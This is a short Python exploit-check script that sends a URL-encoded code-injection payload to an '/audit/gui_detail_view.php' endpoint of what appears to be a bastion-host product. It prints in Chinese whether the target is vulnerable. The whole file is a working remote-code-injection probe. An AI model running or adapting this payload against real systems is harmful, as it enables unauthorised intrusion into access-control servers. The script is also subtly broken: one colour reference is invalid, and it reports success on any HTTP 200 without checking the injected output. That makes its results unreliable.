import requests,re,urllib3
from module import color_one
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def run(url):
    url1=url+"/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"
    try:
        res = requests.get(url=url1,verify=False)
        if res.status_code == 200 :
            print(color_one+green + url1+">>>>>漏洞存在" + color_one.end)
        else:
            print(color_one.red+url+"不存在漏洞"+color_one.end)
    except:
        print(color_one.red+url+"不存在漏洞"+color_one.end)
